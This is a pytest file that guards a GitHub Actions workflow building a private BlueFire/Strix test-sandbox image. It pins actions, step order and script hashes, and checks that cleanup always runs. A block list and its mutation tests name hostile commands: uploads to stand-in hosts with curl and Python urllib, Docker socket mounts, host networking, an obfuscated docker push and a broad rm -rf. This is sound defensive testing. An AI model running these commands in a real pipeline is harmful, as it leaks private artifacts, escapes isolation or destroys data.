"""The hosted test-image lane remains private, exact, and cleanup-complete."""

from __future__ import annotations

import hashlib
import os
import re
import subprocess
import sys
from copy import deepcopy
from pathlib import Path
from typing import Any

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[1]
WORKFLOW = ROOT / ".github/workflows/strix-test-sandbox-image.yml"
APPROVED_ACTIONS = {
    "Checkout exact BlueFire revision without retained credentials": {
        "uses": "actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803",
        "with": {
            "ref": "${{ github.sha }}",
            "fetch-depth": 1,
            "persist-credentials": False,
        },
    },
    "Set up exact Python toolchain": {
        "uses": "actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1",
        "with": {"python-version": "3.12.14", "check-latest": False},
    },
    "Set up exact Go toolchain for the candidate build hook": {
        "uses": "actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e",
        "with": {"go-version": "1.24.10", "cache": False},
    },
    "Set up exact uv frontend without a shared cache": {
        "uses": "astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2",
        "with": {
            "version": "${{ steps.uv-version.outputs.version }}",
            "enable-cache": False,
        },
    },
}
APPROVED_STEP_ORDER = (
    "Checkout exact BlueFire revision without retained credentials",
    "Set up exact Python toolchain",
    "Set up exact Go toolchain for the candidate build hook",
    "Read reviewed uv build version",
    "Set up exact uv frontend without a shared cache",
    "Require the exact private qualification implementation",
    "Rebuild the provenance-bound Strix candidate",
    "Resolve the single exact candidate wheel",
    "Prepare the pinned Strix runtime without execution",
    "Build the minimal worker artifact from this revision",
    "Prepare the sealed worker runtime without claiming execution",
    "Archive the exact committed product source outside checkout",
    "Build the exact native runner from the archived source",
    "Stage exact source and fixed-bootstrap inputs under root custody",
    "Qualify the protected fixed bootstrap without model or tool work",
    "Require finalized same-job runtime composite",
    "Bind the finalized same-job runtime composite",
    "Capture the separate controller Test Caido provider descriptor",
    "Prefetch exact packages and reviewed SBOM tool",
    "Preload the exact reviewed Debian base",
    "Build and qualify the runner-private image",
    "Build the packaged Linux service from the archived source",
    "Bind the exact packaged service wheel",
    "Install the full service in its own clean environment",
    "Smoke the installed service outside checkout",
    "Remove this run's exact private image resources",
    "Remove exact private service build materials",
    "Retain bounded private producer identities",
    "Remove exact protected fixed-bootstrap stage and image handoff",
    "Remove exact private candidate and worker materials",
)
APPROVED_RUN_SHA256 = {
    "Read reviewed uv build version": (
        "ab54a8015eafb51b42820c78fe448dbcb799f0330a75d569b918c970bcb553b8"
    ),
    "Require the exact private qualification implementation": (
        "73d269e571b8af388aecd161b9df4f5806165be4c2dce63dd355d9fc8ec76e25"
    ),
    "Rebuild the provenance-bound Strix candidate": (
        "852989e7371d5748e9626fe7205e51d6dab9a956a0a870e0626b662b89162867"
    ),
    "Resolve the single exact candidate wheel": (
        "d020f6a1b9e6850ac9dad744118235dd5f7c1f1d507d9a266ab4df6f73a66724"
    ),
    "Prepare the pinned Strix runtime without execution": (
        "1af03481f8fab8b760b1137c24deeb2b51edd2d0cde72f1dd6c2159ae3f9b466"
    ),
    "Build the minimal worker artifact from this revision": (
        "ce04dd3898157b7485e1fff8b637acbcf25121a9fdf4c6421cd0697357304b10"
    ),
    "Prepare the sealed worker runtime without claiming execution": (
        "5d353b227fe523018a49c83f2babafe6c4b709c1a155f210d55614d1082ce6e7"
    ),
    "Archive the exact committed product source outside checkout": (
        "6f58334fc11cdf8148cfc4093beb9d9ae53c236047edfc9c43332cbc2a991054"
    ),
    "Build the exact native runner from the archived source": (
        "6c4bfe71908a35d1527850f31d6735af37a8f2e21287d830a01f2f1be6226f32"
    ),
    "Stage exact source and fixed-bootstrap inputs under root custody": (
        "4475bdedb2a6f2d9efad43c530d9f0eec75fab8a1db2b98abbebb3e2f859aa0c"
    ),
    "Qualify the protected fixed bootstrap without model or tool work": (
        "19e82c34b80c1c268712a1c98955ff2c33cda8ecce1482346650293d21477541"
    ),
    "Require finalized same-job runtime composite": (
        "59dcf48bc1b5f33ef5c0586fa2531ef226451d780393abb9ef82ece5f19e6b23"
    ),
    "Bind the finalized same-job runtime composite": (
        "0ea2f15a8aed27698673aa4e38994597dcee0da28c5d40b1977730d944600d45"
    ),
    "Capture the separate controller Test Caido provider descriptor": (
        "a7d559a54a4fbd1e87b38e3d38cde8c7f9a7e632fe13b6f8cb208843a092cff0"
    ),
    "Prefetch exact packages and reviewed SBOM tool": (
        "76ff7521062622cf02bf812758906503571f0f81c9e1296c79ef46b4874e1834"
    ),
    "Preload the exact reviewed Debian base": (
        "4ebf143eb4253ac640fa3de855c6edff75000e1c05480093c36d0abab3562e9d"
    ),
    "Build and qualify the runner-private image": (
        "c070575eb121e2beadc87f146eb1fc28c512eae76c128f1513d4dc0a5b052ef5"
    ),
    "Build the packaged Linux service from the archived source": (
        "296dc9c59012a845b9786077a5829e72f1a2b82dae24138780fb5453e1bfd050"
    ),
    "Bind the exact packaged service wheel": (
        "dff1a3575d8a0c3f0ad97e8d76708c3655081de9b71aaccdecbc6b2fa5b8027a"
    ),
    "Install the full service in its own clean environment": (
        "bc816a07d719d2b5874258a7c64123d51eab80c300b319a46a3095570296c6ea"
    ),
    "Smoke the installed service outside checkout": (
        "da0385c842e6be403fc420d382a155e6c6c1f3b9df3636af48c474ac7d070dd5"
    ),
    "Remove this run's exact private image resources": (
        "1f1ef25c9df87776c59965ddb098c32810bf76dd35517eace4bf4ff5eb83140d"
    ),
    "Remove exact private service build materials": (
        "83d55240ce21675b6b46501411085102bf8f8ae15b7c8e7b1c4d284b79065fcb"
    ),
    "Retain bounded private producer identities": (
        "9bcdfccd1f0b1a92697d5551d701aa054d70b98462e58b5e0e4a5b1ad903a8ba"
    ),
    "Remove exact protected fixed-bootstrap stage and image handoff": (
        "8fce200699e41529999e8cae38fba6da5d22f4fb60384883855e1ae5d08b9fa4"
    ),
    "Remove exact private candidate and worker materials": (
        "b3dd800584d27e5d2977c8d869dfb4de9a47e51fa11294fe8dd209151f0369eb"
    ),
}
FORBIDDEN = (
    "docker login",
    "docker push",
    "docker system prune",
    "docker image prune",
    "docker container prune",
    "docker network prune",
    "gh release",
    "gh api",
    "aws s3",
    "gcloud storage",
    "az storage",
    "curl -t",
    "curl --upload-file",
    "--network host",
    "--network=host",
    "host.docker.internal:host-gateway",
    "-v /var/run/docker.sock",
    "--volume /var/run/docker.sock",
    "--mount type=bind,source=/var/run/docker.sock",
    "rm -rf $runner_temp",
    'rm -rf "$runner_temp"',
    "|| true",
    "|| exit 0",
    "|| echo",
    "if command -v docker",
    "strix-sandbox",
    "usestrix/strix-sandbox",
    "kali-rolling",
    "caidoapp/caido",
)


def _load() -> dict[str, Any]:
    return yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))


def _trigger(workflow: dict[str, Any]) -> Any:
    return workflow.get("on", workflow.get(True))


def _step(workflow: dict[str, Any], name: str) -> dict[str, Any]:
    matches = [
        step
        for job in workflow["jobs"].values()
        for step in job["steps"]
        if step.get("name") == name
    ]
    assert len(matches) == 1
    return matches[0]


def _assert_private_workflow(workflow: dict[str, Any]) -> None:
    assert _trigger(workflow) == {"workflow_dispatch": None}
    assert workflow["permissions"] == {"contents": "read"}
    assert workflow["concurrency"] == {
        "group": (
            "strix-test-sandbox-image-${{ github.sha }}-"
            "${{ github.run_id }}-${{ github.run_attempt }}"
        ),
        "cancel-in-progress": False,
    }
    assert set(workflow["jobs"]) == {"qualify"}
    job = workflow["jobs"]["qualify"]
    assert job["runs-on"] == "ubuntu-24.04"
    assert 1 <= job["timeout-minutes"] <= 90
    assert not any(job.get(key) for key in ("env", "defaults", "container", "services"))
    assert not job.get("continue-on-error")
    assert tuple(step.get("name") for step in job["steps"]) == APPROVED_STEP_ORDER

    for step in job["steps"]:
        assert ("uses" in step) != ("run" in step)
        assert not step.get("continue-on-error")
        assert "working-directory" not in step
        assert not step.get("env")
        if "uses" in step:
            assert set(step) == {"name", "uses", "with"}
            assert {key: step[key] for key in ("uses", "with")} == APPROVED_ACTIONS[step["name"]]
        else:
            assert set(step) <= {"name", "id", "if", "shell", "run"}
            assert step.get("shell") == "bash"
            assert (
                hashlib.sha256(step["run"].encode()).hexdigest()
                == APPROVED_RUN_SHA256[step["name"]]
            )
            lowered = step["run"].lower()
            for fragment in FORBIDDEN:
                assert fragment not in lowered
            assert (
                re.search(
                    r"(?:docker\.io/|ghcr\.io/|quay\.io/)[a-z0-9._/-]+:"
                    r"(?:latest|[a-z][a-z0-9._-]*)\b",
                    lowered,
                )
                is None
            )

    checkout = job["steps"][0]
    assert checkout["uses"] == "actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803"
    assert checkout["with"] == {
        "ref": "${{ github.sha }}",
        "fetch-depth": 1,
        "persist-credentials": False,
    }

    prerequisite = _step(workflow, "Require the exact private qualification implementation")["run"]
    for required in (
        "tools/qualify_strix_test_sandbox_image.py",
        "tools/qualify_strix_runtime_candidate.py",
        "tools/build_strix_worker_runtime_artifact.py",
        "tools/prepare_strix_linux_runtime_closure.py",
        "tools/qualify_strix_linux_fixed_exec.py",
        "tools/build_native_runner.py",
        "tools/strix_runtime_closure_prepare_core.py",
        "bluefire/test_caido_protocol_entry.py",
        "bluefire/test_caido_protocol_provider.py",
        "bluefire/test_caido_protocol_server.py",
        "test -S /var/run/docker.sock",
        "docker version --format",
        "docker buildx inspect default",
        "skopeo --version",
        "dpkg-query -W",
        'test "$(git rev-parse HEAD)" = "${{ github.sha }}"',
    ):
        assert required in prerequisite

    final_inputs = _step(workflow, "Require finalized same-job runtime composite")["run"]
    assert "Observed fixed-bootstrap qualification is unavailable" in final_inputs
    assert "Image admission cannot proceed without its same-job native receipt" in final_inputs
    assert "exit 2" in final_inputs
    for required in (
        "steps.prelaunch.outputs.manifest",
        "steps.fixed.outputs.root",
        "steps.fixed.outputs.manifest",
        "steps.fixed.outputs.qualification",
        "steps.fixed.outputs.plan",
        "steps.fixed.outputs.handoff",
    ):
        assert required in final_inputs

    runtime = _step(workflow, "Bind the finalized same-job runtime composite")["run"]
    assert "bluefire.strix-linux-qualified-runtime-composite.v1" in runtime
    assert 'row.get("composite_ref")' in runtime
    assert 'print(f"ref={reference}")' in runtime
    assert "prepare_strix_linux_runtime_closure" not in runtime
    for required in (
        "prelaunch_plan_ref",
        "fixed_exec_qualification_ref",
        "worker_artifact_digest",
        "worker_record_digest",
        "installed_distributions_digest",
        "bluefire-strix-worker",
        "worker_source_revision",
        "installed_worker_invocation_digest",
        "full_product_wheel_present",
        "bluefire.strix-fixed-bootstrap-image-handoff.v1",
        "StrixLinuxRuntimeClosurePlan.from_mapping",
        "runtime_inventory_digest(runtime_root)",
        'qualification.get("scope") != "fixed-exec-bootstrap"',
        'qualification.get("installed_worker_entrypoint_executed") is not None',
        'qualification.get("installed_worker_entrypoint_qualified") is not False',
        'qualification.get("product_activation") is not False',
        'qualification.get("model_tool_target_effects") is not False',
        'qualification.get("verified_absent") is not True',
    ):
        assert required in runtime

    candidate = _step(workflow, "Resolve the single exact candidate wheel")["run"]
    assert "-name 'strix_agent-1.7.0-*.whl'" in candidate
    assert '[[ "${#wheels[@]}" -ne 1 ]]' in candidate
    assert '>> "$GITHUB_OUTPUT"' in candidate

    candidate_preparation = _step(workflow, "Prepare the pinned Strix runtime without execution")
    assert "python -m tools.qualify_strix_runtime_candidate" in candidate_preparation["run"]
    assert '--bluefire-source-revision "${{ github.sha }}"' in candidate_preparation["run"]

    worker = _step(workflow, "Build the minimal worker artifact from this revision")
    assert worker["id"] == "worker"
    for required in (
        "python -m tools.build_strix_worker_runtime_artifact",
        '--source-revision "${{ github.sha }}"',
        "import os",
        'root = Path(os.environ["RUNNER_TEMP"]).resolve()',
        "bluefire.strix-worker-runtime-build-result.v1",
        "worker_record_digest",
        "manifest_digest",
        'print(f"artifact={artifact}")',
        "print(f\"sha256={digest.removeprefix('sha256:')}\")",
    ):
        assert required in worker["run"]

    prelaunch = _step(workflow, "Prepare the sealed worker runtime without claiming execution")
    assert prelaunch["id"] == "prelaunch"
    for required in (
        "python -m tools.prepare_strix_linux_runtime_closure",
        "steps.candidate.outputs.wheel",
        "steps.worker.outputs.artifact",
        "steps.worker.outputs.sha256",
        "runtime_inventory_digest(closure)",
        "prepared-not-startup-qualified",
        'print(f"root={closure}")',
    ):
        assert required in prelaunch["run"]

    archive = _step(workflow, "Archive the exact committed product source outside checkout")
    assert archive["id"] == "source"
    for required in (
        'test "$(git rev-parse HEAD)" = "${{ github.sha }}"',
        "git -c tar.umask=0022 archive --format=tar",
        '"${{ github.sha }}"',
        "bluefire/_source_revision.txt",
        "bluefire-product-source.tar",
        'print("digest=sha256:"',
    ):
        assert required in archive["run"]

    native = _step(workflow, "Build the exact native runner from the archived source")
    assert native["id"] == "native_runner"
    for required in (
        'source="$RUNNER_TEMP/bluefire-product-source"',
        "RUSTUP_HOME=",
        "CARGO_HOME=",
        "rustup target add x86_64-unknown-linux-musl",
        "python tools/build_native_runner.py --target x86_64-unknown-linux-musl",
        'print(f"path={runner}")',
        'print("digest=sha256:"',
    ):
        assert required in native["run"]

    protected = _step(workflow, "Stage exact source and fixed-bootstrap inputs under root custody")
    assert protected["id"] == "protected"
    for required in (
        "sudo -n /usr/bin/env -i",
        "PATH=/usr/bin:/bin /usr/bin/python3 -I -B -",
        'root != workspace.parents[1] / "_temp"',
        'base = Path("/var/tmp")',
        "stat.S_IMODE(base_details.st_mode) != 0o1777",
        "stage.mkdir(mode=0o700)",
        'source.extractall(source_dir, filter="data")',
        'source_dir / "bluefire/_source_revision.txt"',
        "runtime_inventory_digest(runtime)",
        'inputs / "worker" / worker_source.name',
        'inputs / "runner/bluefire-runner"',
        'os.environ["RUNNER_DIGEST"], 0o555',
    ):
        assert required in protected["run"]

    fixed = _step(workflow, "Qualify the protected fixed bootstrap without model or tool work")
    assert fixed["id"] == "fixed"
    for required in (
        "sudo -n /usr/bin/env -i",
        "PATH=/usr/bin:/bin /usr/bin/python3 -I -B -",
        'source / "bluefire/_source_revision.txt"',
        "from tools.qualify_strix_linux_fixed_exec import main",
        '"--worker-artifact", str(wheels[0])',
        '"--runner-sha256", os.environ["RUNNER_DIGEST"]',
        '"--expected-worker-source-revision", os.environ["SOURCE_SHA"]',
        'marker = stage / "qualifier-started"',
        "runtime_inventory_digest(copied_root)",
        '"bluefire.strix-fixed-bootstrap-image-handoff.v1"',
        '"fixed-exec-bootstrap-copy-after-verified-absence"',
        'print(f"handoff={handoff}")',
    ):
        assert required in fixed["run"]

    provider = _step(workflow, "Capture the separate controller Test Caido provider descriptor")[
        "run"
    ]
    assert "python -m bluefire.test_caido_protocol_provider --describe" in provider
    assert "strix-linux-runtime-root/runtime/bin/python" not in provider
    assert "bluefire.test-caido-protocol-provider-descriptor.v1" in provider
    assert "provider_source_digest" in provider
    assert '>> "$GITHUB_OUTPUT"' in provider

    qualify = _step(workflow, "Build and qualify the runner-private image")["run"]
    for required in (
        "python -m tools.qualify_strix_test_sandbox_image qualify",
        '--bluefire-source-revision "${{ github.sha }}"',
        '--qualifier-revision "${{ github.sha }}"',
        '--runtime-root "${{ steps.fixed.outputs.root }}"',
        '--runtime-composite-manifest "${{ steps.fixed.outputs.manifest }}"',
        '--runtime-composite-ref "${{ steps.runtime.outputs.ref }}"',
        "--provider-source bluefire/test_caido_protocol_entry.py",
        "--provider-source bluefire/test_caido_protocol_provider.py",
        "--provider-source bluefire/test_caido_protocol_server.py",
        '--provider-source-digest "${{ steps.provider.outputs.digest }}"',
        '--package-root "$RUNNER_TEMP/bluefire-strix-test-sandbox-packages"',
        '--syft "$RUNNER_TEMP/bluefire-strix-test-sandbox-tools/syft"',
        '--output-root "$RUNNER_TEMP/bluefire-strix-test-sandbox-output"',
        '--work-root "$RUNNER_TEMP/bluefire-strix-test-sandbox-work"',
        "--docker-socket unix:///var/run/docker.sock",
    ):
        assert required in qualify
    assert "timeout --signal=TERM --kill-after=30s 20m" in qualify

    base = _step(workflow, "Preload the exact reviewed Debian base")["run"]
    assert (
        "docker.io/library/debian@"
        "sha256:3783cc01769c7b2b1b83a5c5ad96c815348e28ed7da68e2e3687004faa906251"
    ) in base
    assert 'docker pull "$base"' in base
    assert 'docker image inspect "$base"' in base

    package = _step(workflow, "Build the packaged Linux service from the archived source")
    for required in (
        'source="$RUNNER_TEMP/bluefire-product-source"',
        "steps.native_runner.outputs.path",
        "steps.native_runner.outputs.digest",
        "python tools/stage_native_runner.py",
        "python -m build --wheel",
        "python tools/verify_packaged_runner.py inspect",
        "--wheel-platform-tag linux_x86_64",
    ):
        assert required in package["run"]

    product = _step(workflow, "Bind the exact packaged service wheel")
    assert product["id"] == "product"
    for required in (
        "len(wheels) != 1",
        "bluefire/_build_info.json",
        'metadata.get("source_revision") != "${{ github.sha }}"',
        'metadata.get("source_provenance") != "git_archive"',
        'print(f"wheel={wheel}")',
        'print(f"digest={digest}")',
    ):
        assert required in product["run"]

    installed = _step(workflow, "Install the full service in its own clean environment")
    assert 'python -m venv "$RUNNER_TEMP/bluefire-installed-service"' in installed["run"]
    assert '"${{ steps.product.outputs.wheel }}"' in installed["run"]
    smoke = _step(workflow, "Smoke the installed service outside checkout")
    assert 'cd "$RUNNER_TEMP"' in smoke["run"]
    assert '"$RUNNER_TEMP/bluefire-installed-service/bin/python" -I -B' in smoke["run"]
    assert '--forbid-root "$GITHUB_WORKSPACE"' in smoke["run"]
    assert "bluefire-installed-service-smoke.json" in smoke["run"]

    cleanup = _step(workflow, "Remove this run's exact private image resources")
    assert cleanup.get("if") == "${{ always() }}"
    assert "python -m tools.qualify_strix_test_sandbox_image cleanup" in cleanup["run"]
    assert "python -m tools.qualify_strix_test_sandbox_image cleanup-partial" in cleanup["run"]
    assert "strix-test-sandbox-image-manifest.json" in cleanup["run"]
    assert "strix-test-sandbox-private-ledger.json" in cleanup["run"]
    assert "bluefire.strix-test-sandbox-private-ledger.v2" in cleanup["run"]
    assert '{"reserved", "image-bound", "qualified"}' in cleanup["run"]
    assert 'output="$RUNNER_TEMP/bluefire-strix-test-sandbox-output"' in cleanup["run"]
    assert 'test ! -e "$ledger"' in cleanup["run"]
    assert job["steps"][-5] is cleanup

    service_cleanup = _step(workflow, "Remove exact private service build materials")
    assert service_cleanup.get("if") == "${{ always() }}"
    for required in (
        'root = Path(os.environ["RUNNER_TEMP"]).resolve(strict=True)',
        '"bluefire-product-source.tar"',
        '"bluefire-product-source"',
        '"bluefire-product-rustup"',
        '"bluefire-product-cargo"',
        '"bluefire-installed-service"',
        '"bluefire-installed-service-state"',
        '"verify_packaged_runner.py"',
        "path.is_symlink()",
        "shutil.rmtree(path)",
        "private service build material remains",
    ):
        assert required in service_cleanup["run"]
    assert job["steps"][-4] is service_cleanup

    identity = _step(workflow, "Retain bounded private producer identities")
    assert identity.get("if") == "${{ always() }}"
    for required in (
        'evidence = root / "bluefire-strix-evidence"',
        "output.is_symlink()",
        "output.resolve(strict=True).parent != root",
        "output.exists() and not output.is_dir()",
        'path = evidence / "producer-identity.json"',
        '"bluefire_wheel_digest"',
        '"strix_candidate_digest"',
        '"worker_wheel_digest"',
        '"runtime_composite_ref"',
        '"image_index_digest"',
        '"image_manifest_digest"',
        '"image_config_digest"',
        '"test_provider_digest"',
        'image_version = os.environ.get("ImageVersion", "")',
        '"os_image": "ubuntu-24.04"',
        '"runner_image_version": image_version',
        '"architecture": "x86_64"',
        '"identities-only-no-installed-execution-proof"',
        "mode=0o700",
        "os.O_NOFOLLOW",
        "os.open(path, flags, 0o600)",
        "StrixTestSandboxImageContractV1(manifest.read_bytes())",
        "StrixTestSandboxImageCleanupReceiptV1(cleanup.read_bytes())",
    ):
        assert required in identity["run"]
    assert job["steps"][-3] is identity

    protected_cleanup = _step(
        workflow, "Remove exact protected fixed-bootstrap stage and image handoff"
    )
    assert protected_cleanup.get("if") == "${{ always() }}"
    for required in (
        "sudo -n /usr/bin/env -i",
        'base = Path("/var/tmp")',
        'stage = base / f"bluefire-strix-fixed-{run_id}-{attempt}"',
        'handoff = base / f"bluefire-strix-handoff-{run_id}-{attempt}"',
        "stat.S_IMODE(base_details.st_mode) != 0o1777",
        "stat.S_IMODE(handoff_details.st_mode) != 0o755",
        'root != workspace.parents[1] / "_temp"',
        'raise SystemExit("image cleanup unresolved; protected stage and handoff retained")',
        'qualification.get("verified_absent") is not True',
        "shutil.rmtree.avoids_symlink_attacks",
        "shutil.rmtree(handoff)",
        "shutil.rmtree(stage)",
    ):
        assert required in protected_cleanup["run"]
    assert job["steps"][-2] is protected_cleanup

    candidate_cleanup = _step(workflow, "Remove exact private candidate and worker materials")
    assert candidate_cleanup.get("if") == "${{ always() }}"
    for required in (
        'root_path = Path(os.environ["RUNNER_TEMP"])',
        "sudo -n /usr/bin/env -i",
        'RUNNER_TEMP="$RUNNER_TEMP" GITHUB_WORKSPACE="$GITHUB_WORKSPACE"',
        "PATH=/usr/bin:/bin /usr/bin/python3 -I -B -",
        'workspace_path = Path(os.environ["GITHUB_WORKSPACE"])',
        'root != workspace.parents[1] / "_temp"',
        "path.parent != root or path.is_symlink()",
        "path.resolve(strict=True).parent != root",
        "shutil.rmtree.avoids_symlink_attacks",
        '"bluefire-strix-candidate-work"',
        '"bluefire-strix-candidate-output"',
        '"bluefire-strix-qualification-work"',
        '"bluefire-strix-qualification-output"',
        '"bluefire-worker-artifact"',
        '"bluefire-strix-runtime-preparation"',
        '"bluefire-strix-runtime-composite"',
        '"bluefire-strix-test-sandbox-packages"',
        '"bluefire-strix-test-sandbox-tools"',
    ):
        assert required in candidate_cleanup["run"]
    assert "bluefire-strix-evidence" not in candidate_cleanup["run"]
    assert "bluefire-strix-test-sandbox-output" not in candidate_cleanup["run"]
    assert job["steps"][-1] is candidate_cleanup

    scripts = "\n".join(step["run"] for step in job["steps"] if "run" in step).lower()
    assert "actions/upload-artifact" not in scripts
    assert "bluefire-nexus.whl" not in scripts
    assert "docker buildx build" not in scripts
    assert "docker build " not in scripts
    assert "docker run " not in scripts
    assert "docker rm " not in scripts


def test_workflow_is_same_job_private_qualification() -> None:
    _assert_private_workflow(_load())


@pytest.mark.parametrize(
    "action",
    [
        "actions/upload-artifact@" + "a" * 40,
        "actions/cache@" + "b" * 40,
        "docker/login-action@" + "c" * 40,
        "docker/build-push-action@" + "d" * 40,
        "third-party/publisher@" + "e" * 40,
    ],
)
def test_publication_and_cache_actions_are_rejected(action: str) -> None:
    workflow = _load()
    workflow["jobs"]["qualify"]["steps"].insert(
        -1, {"name": "Publish", "uses": action, "with": {"path": "."}}
    )
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)


@pytest.mark.parametrize(
    "script",
    [
        "docker login ghcr.io",
        "docker push localhost/bluefire/test:latest",
        "docker system prune -af",
        "docker run --network host image",
        "docker run --add-host=host.docker.internal:host-gateway image",
        "docker run -v /var/run/docker.sock:/var/run/docker.sock image",
        "docker build -t docker.io/library/debian:bookworm .",
        "docker pull ghcr.io/usestrix/strix-sandbox@sha256:" + "0" * 64,
        "curl --upload-file image.tar https://uploads.invalid/image.tar",
        "gh release upload test image.tar",
        'rm -rf "$RUNNER_TEMP"',
        """python - <<'PY'
import urllib.request
urllib.request.urlopen(
    urllib.request.Request("https://invalid.example", data=b"private")
)
PY""",
        'cmd=docker; sub=push; "$cmd" "$sub" localhost/private:test',
        "docker pull debian:bookworm",
    ],
)
def test_shell_publication_host_escape_and_broad_cleanup_are_rejected(script: str) -> None:
    workflow = _load()
    workflow["jobs"]["qualify"]["steps"].insert(
        -1, {"name": "Mutation", "shell": "bash", "run": script}
    )
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)


@pytest.mark.parametrize(
    "removed",
    [
        '--bluefire-source-revision "${{ github.sha }}"',
        '--runtime-composite-ref "${{ steps.runtime.outputs.ref }}"',
        "--provider-source bluefire/test_caido_protocol_entry.py",
        '--provider-source-digest "${{ steps.provider.outputs.digest }}"',
        '--package-root "$RUNNER_TEMP/bluefire-strix-test-sandbox-packages"',
        '--syft "$RUNNER_TEMP/bluefire-strix-test-sandbox-tools/syft"',
        "--docker-socket unix:///var/run/docker.sock",
    ],
)
def test_qualification_cannot_drop_exact_inputs(removed: str) -> None:
    workflow = _load()
    step = _step(workflow, "Build and qualify the runner-private image")
    step["run"] = step["run"].replace(removed, "")
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)


@pytest.mark.parametrize(
    "fallback",
    [
        "command -v docker >/dev/null || exit 0",
        "test -S /var/run/docker.sock || echo 'docker_executed:false'",
        "python -m tools.qualify_strix_test_sandbox_image qualify || true",
        "if command -v docker; then echo qualified; else echo skipped; fi",
    ],
)
def test_missing_docker_cannot_become_a_pass(fallback: str) -> None:
    workflow = _load()
    workflow["jobs"]["qualify"]["steps"].insert(
        -1, {"name": "False fallback", "shell": "bash", "run": fallback}
    )
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)


def test_cleanup_is_last_always_and_non_cancellable() -> None:
    workflow = _load()
    _step(workflow, "Remove this run's exact private image resources")["if"] = "${{ success() }}"
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)

    workflow = _load()
    workflow["concurrency"]["cancel-in-progress"] = True
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)

    workflow = _load()
    workflow["jobs"]["qualify"]["steps"].append(
        {"name": "After cleanup", "shell": "bash", "run": "echo done"}
    )
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)


def test_dispatch_has_no_caller_selected_image_or_digest_inputs() -> None:
    workflow = deepcopy(_load())
    _trigger(workflow)["workflow_dispatch"] = {
        "inputs": {"base": {"type": "string", "required": True}}
    }
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)


def test_private_candidate_cleanup_removes_only_its_exact_materials(tmp_path: Path) -> None:
    step = _step(_load(), "Remove exact private candidate and worker materials")
    script = step["run"].split("<<'PY'\n", 1)[1].rsplit("\nPY", 1)[0]
    workspace = tmp_path / "work" / "repository" / "repository"
    workspace.mkdir(parents=True)
    runner_temp = tmp_path / "work" / "_temp"
    runner_temp.mkdir()
    candidate = runner_temp / "bluefire-strix-candidate-work"
    candidate.mkdir()
    (candidate / "source.py").write_text("generated candidate", encoding="utf-8")
    (runner_temp / "bluefire-worker-build-result.json").write_text("{}", encoding="utf-8")
    evidence = runner_temp / "bluefire-strix-evidence"
    evidence.mkdir()
    (evidence / "producer-identity.json").write_text("retained", encoding="utf-8")
    output = runner_temp / "bluefire-strix-test-sandbox-output"
    output.mkdir()
    (output / "strix-test-sandbox-image-cleanup.json").write_text("retained", encoding="utf-8")
    unrelated = runner_temp / "unrelated.txt"
    unrelated.write_text("retained", encoding="utf-8")

    result = subprocess.run(
        [sys.executable, "-c", script],
        env={**os.environ, "RUNNER_TEMP": str(runner_temp), "GITHUB_WORKSPACE": str(workspace)},
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode == 0, result.stderr
    assert not candidate.exists()
    assert not (runner_temp / "bluefire-worker-build-result.json").exists()
    assert (evidence / "producer-identity.json").read_text(encoding="utf-8") == "retained"
    assert (output / "strix-test-sandbox-image-cleanup.json").read_text(
        encoding="utf-8"
    ) == "retained"
    assert unrelated.read_text(encoding="utf-8") == "retained"


def test_private_candidate_cleanup_refuses_a_symbolic_link(tmp_path: Path) -> None:
    step = _step(_load(), "Remove exact private candidate and worker materials")
    script = step["run"].split("<<'PY'\n", 1)[1].rsplit("\nPY", 1)[0]
    workspace = tmp_path / "work" / "repository" / "repository"
    workspace.mkdir(parents=True)
    runner_temp = tmp_path / "work" / "_temp"
    runner_temp.mkdir()
    destination = runner_temp / "outside"
    destination.mkdir()
    (destination / "keep.txt").write_text("retained", encoding="utf-8")
    link = runner_temp / "bluefire-strix-candidate-work"
    try:
        link.symlink_to(destination, target_is_directory=True)
    except (NotImplementedError, OSError):
        pytest.skip("symbolic links unavailable on this test host")

    result = subprocess.run(
        [sys.executable, "-c", script],
        env={**os.environ, "RUNNER_TEMP": str(runner_temp), "GITHUB_WORKSPACE": str(workspace)},
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode != 0
    assert "private candidate cleanup path is invalid" in result.stderr
    assert link.is_symlink()
    assert (destination / "keep.txt").read_text(encoding="utf-8") == "retained"


def test_private_candidate_cleanup_refuses_another_temp_root(tmp_path: Path) -> None:
    step = _step(_load(), "Remove exact private candidate and worker materials")
    script = step["run"].split("<<'PY'\n", 1)[1].rsplit("\nPY", 1)[0]
    workspace = tmp_path / "work" / "repository" / "repository"
    workspace.mkdir(parents=True)
    wrong_temp = tmp_path / "other-temp"
    candidate = wrong_temp / "bluefire-strix-candidate-work"
    candidate.mkdir(parents=True)
    (candidate / "keep.txt").write_text("retained", encoding="utf-8")

    result = subprocess.run(
        [sys.executable, "-c", script],
        env={**os.environ, "RUNNER_TEMP": str(wrong_temp), "GITHUB_WORKSPACE": str(workspace)},
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode != 0
    assert "private runner root is not the workspace sibling temp" in result.stderr
    assert (candidate / "keep.txt").read_text(encoding="utf-8") == "retained"
